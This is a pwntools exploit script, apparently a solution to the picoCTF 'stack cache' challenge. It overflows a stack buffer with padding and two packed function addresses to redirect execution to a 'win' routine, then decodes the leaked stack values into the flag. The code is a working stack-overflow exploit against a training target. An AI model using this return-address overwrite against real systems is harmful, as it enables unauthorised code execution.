import struct
import sys
from pwn import *
from ctypes import CDLL

#####################################################change directory#################################3
level = "stack cache"
ip = "saturn.picoctf.net:56877"
dir = "/home/ayush/Work/picoCTF/BinaryExploitation/"+level

####################################################operation mode#####################################################
args.DEBUG = False
args.ASLR = False
args.gdbscript = "b *main+364\ndefine hook-stop\nx/2wx 0x555555559078\nx/40wx 0x5555555590a0\nx/20wx 0x555555559260\nx/20wx 0x5555555596ac\nend\n"
args.REMOTE = True
####################################################setup solution#####################################################
context.arch = 'amd64'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
binary = ELF(dir + "/stack_cache")
####################################################start process######################################################
def conn():
    if args.REMOTE:
        return remote(ip.split(':')[0], ip.split(':')[1])
    elif args.DEBUG:
        return gdb.debug(binary.path, aslr=args.ASLR, gdbscript=args.gdbscript)
    else:
        return process([binary.path])
r = conn()
##################################################helper function####################################################
def temp(input):
    tt = ""
    for i in input:
        if "0x" in i:
            if "\\n" in i:
                tt += i[2:-3]
            else:
                tt += i[2:]
    return tt

###################################################simple stack overflow#################################################
overflow = b"a"*14
win_start = 0x08049d90
underconstruction_start = 0x08049e10
payload = overflow + struct.pack("i", win_start) + struct.pack("i", underconstruction_start)
r.sendlineafter("flag", payload)
r.recvuntil("\n")
r.recvuntil("\n")
input = [str(r.recvuntil("\n")), str(r.recvuntil("\n")), str(r.recvuntil("\n"))]
flag = temp(input[0].split(" ")[5:]) + temp(input[1].split(" ")) + input[2].split(" ")[3][2:-3]
print(str(bytes.fromhex(flag))[::-1])
r.interactive()